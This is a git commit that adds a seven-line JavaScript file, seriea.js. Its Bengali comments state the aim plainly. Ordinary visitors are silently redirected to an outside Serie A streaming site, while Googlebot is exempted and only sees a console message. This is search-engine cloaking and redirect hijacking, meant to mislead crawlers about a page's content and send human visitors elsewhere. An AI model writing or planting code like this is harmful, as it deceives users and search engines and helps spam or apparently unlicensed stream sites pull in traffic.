d17ff4db81f9c5d1691c75b479ab0a37c4c5dc12
Asaduzzaman Asad <zzamantowfik1@proton.me>
2026-08-29 22:56:34 +0600

    Create seriea.js

---
+++ seriea.js
@@ -0,0 +1,7 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
+  window.location.href = "https://www.streamsonscreen.live/serie-a/";
+} else {
+  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
+  console.log("Thanks for visiting my page" );
+}
